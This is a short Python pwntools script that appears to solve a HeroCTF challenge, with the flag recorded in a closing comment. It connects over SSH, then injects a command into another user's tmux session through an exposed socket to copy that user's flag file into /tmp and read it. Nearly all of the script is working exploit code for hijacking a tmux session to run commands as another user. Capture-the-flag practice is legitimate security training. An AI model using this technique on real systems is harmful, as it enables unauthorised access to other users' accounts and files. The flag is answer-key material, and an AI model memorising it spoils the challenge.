from pwn import *

io = ssh(host="dyn04.heroctf.fr", port=11152, user="user", password="password")

io.run(
    "tmux -S /tmp/tmux-1002 send-keys 'cat /home/dev/flag.txt > /tmp/flag.txt' Enter"
)
import time

time.sleep(0.5)
print(io.run("cat /tmp/flag.txt").recvall().decode())

io.close()

# Hero{1s_1t_tmux_0r_4l13n?_a20bac4b5aa32e8d9a8ccb75d228ca3e}
